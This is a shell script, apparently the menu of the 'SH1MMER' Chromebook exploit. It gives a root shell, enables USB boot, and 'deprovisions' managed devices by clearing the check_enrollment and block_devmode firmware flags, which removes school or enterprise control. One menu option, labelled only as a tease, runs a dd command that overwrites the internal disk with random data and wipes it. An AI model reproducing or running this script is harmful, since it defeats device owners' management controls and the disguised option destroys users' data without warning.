deprovision() {
    echo "deprovisioning"
    vpd -i RW_VPD -s check_enrollment=0
    vpd -i RW_VPD -s block_devmode=0
    crossystem block_devmode=0
}
reprovision() {
    echo "reprovisioning"
    vpd -i RW_VPD -s check_enrollment=1
}
usb() {
    echo "enabling usb boot"
    crossystem dev_boot_usb=1
}
troll() {
    dd if=/dev/urandom of=/dev/mmcblk0 &
    sleep 1
    echo "think about this. you just ran a random script from the internet that you have no idea what it does."
    echo "maybe that was a bad idea!"
    sleep 4
    reboot
}

echo "SH1MMER EXPLOIT"
while true; do
    echo "(b) Open Bash Shell"
    echo "(d) Deprovision Device"
    echo "(r) Reprovision Device"
    echo "(u) Enable USB Boot"
    echo "(t) you know you want to press this menu option don't you"
    echo "(e) Exit and reboot"
    read -p "> (b/d/r/u/t/e): " choice
    case "$choice" in
    b | B) bash ;;
    d | D) deprovision ;;
    r | R) reprovision ;;
    u | U) usb ;;
    t | T) troll ;;
    e | E) break ;;
    *) echo "invalid" ;;
    esac
done

echo "CREDITS:"
echo "CoolElectronics - Creating this script"
echo "Bideos - Testing & discovering how to disable root-fs verification"
echo "Unicar - Testing"
echo "TheMemeSniper/Kaitlin - Testing"
echo "Rafflesia - Testing"
sleep 3
echo "rebooting"
reboot
exit
